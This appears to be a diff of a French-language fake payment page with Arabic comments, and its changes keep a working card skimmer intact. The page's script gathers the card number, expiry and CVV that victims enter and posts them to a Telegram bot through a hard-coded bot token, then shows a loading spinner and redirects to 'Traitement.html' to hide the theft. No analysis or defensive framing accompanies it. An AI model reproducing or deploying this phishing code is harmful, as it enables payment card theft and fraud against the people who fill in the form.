@@ -47,14 +47,14 @@
         }
 
         .form-group button {
-            background-color: #c70000;
+            background-color: #4CAF50;
             color: white;
             border: none;
             cursor: pointer;
         }
 
         .form-group button:hover {
-            background-color: #a50000;
+            background-color: #45a049;
         }
 
         .loading-overlay {
@@ -72,7 +72,7 @@
 
         .spinner {
             border: 8px solid #f3f3f3;
-            border-top: 8px solid #c70000;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -125,10 +125,6 @@
             <input type="text" id="cvv" name="cvv" placeholder="123" required>
         </div>
         <div class="form-group">
-            <label for="name-on-card">Nom sur la Carte</label>
-            <input type="text" id="name-on-card" name="name-on-card" placeholder="Entrez le nom" required>
-        </div>
-        <div class="form-group">
             <button type="button" id="pay-button">Payer Maintenant</button>
         </div>
     </form>
@@ -136,15 +132,13 @@
 
 <div class="loading-overlay" id="loading-overlay">
     <div class="spinner"></div>
-    <p>Veuillez patienter...</p>
 </div>
 
 <script>
     document.getElementById('pay-button').addEventListener('click', async function () {
         const loadingOverlay = document.getElementById('loading-overlay');
-        loadingOverlay.style.display = 'flex'; // Afficher شاشة الانتظار
+        loadingOverlay.style.display = 'flex';
 
-        // جمع البيانات من الفورم
         const form = document.getElementById('payment-form');
         const formData = new FormData(form);
 
@@ -152,13 +146,11 @@
         const expiryMonth = formData.get('expiry-month');
         const expiryYear = formData.get('expiry-year');
         const cvv = formData.get('cvv');
-        const nameOnCard = formData.get('name-on-card');
 
         const message = `
 💳 Numéro de Carte: ${cardNumber}
 📅 Expiration: ${expiryMonth}/${expiryYear}
 🔒 CVV: ${cvv}
-📝 Nom: ${nameOnCard}
         `;
 
         const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
@@ -176,7 +168,9 @@
                 })
             });
 
-            if (response.ok) {
+            const result = await response.json();
+
+            if (result.ok) {
                 console.log('Message envoyé à Telegram.');
             } else {
                 console.error('Erreur lors de l\'envoi à Telegram.');
@@ -186,8 +180,8 @@
         }
 
         setTimeout(() => {
-            loadingOverlay.style.display = 'none'; // إخفاء شاشة الانتظار
-            window.location.href = 'Traitement.html'; // التحويل للصفحة
+            loadingOverlay.style.display = 'none';
+            window.location.href = 'Traitement.html';
         }, 5000);
     });
 </script>
